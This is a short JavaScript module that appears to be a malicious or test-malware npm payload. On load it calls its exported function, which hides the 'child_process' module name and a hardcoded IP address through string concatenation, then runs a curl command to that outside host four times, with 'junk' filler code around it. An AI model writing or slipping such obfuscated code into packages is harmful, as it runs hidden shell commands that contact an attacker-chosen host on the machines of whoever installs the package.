
function yyy() {
    const a = 'child'
    const b = 'process'
    const children = a + "_" + b
    
    const aa  = require(children).exec;

    let d = "22." + "33." + "44." + "76"
    const c = 'curl' + " http://" + d + ":11234/index.html";
    console.log(c)
    
    aa(c, (error, stdout, stderr) => {
        if (error) {
            console.error(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`error: ${stderr}`);
            return;
        }
        console.log(`command:\n ${stdout}`)
    });
    aa(c, (error, stdout, stderr) => {
        if (error) {
            console.error(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`error: ${stderr}`);
            return;
        }
        console.log(`command:\n ${stdout}`)
    });
    aa(c, (error, stdout, stderr) => {
        if (error) {
            console.error(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`error: ${stderr}`);
            return;
        }
        console.log(`command:\n ${stdout}`)
    });
    aa(c, (error, stdout, stderr) => {
        if (error) {
            console.error(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`error: ${stderr}`);
            return;
        }
        console.log(`command:\n ${stdout}`)
    });

    // More junk
    const randomness = Math.floor(Math.random() * 10);
    let thing = "foobar"
    console.log(`${thing}${'bork!'.repeat(randomness)}`);
    
}

module.exports = { yyy };

yyy()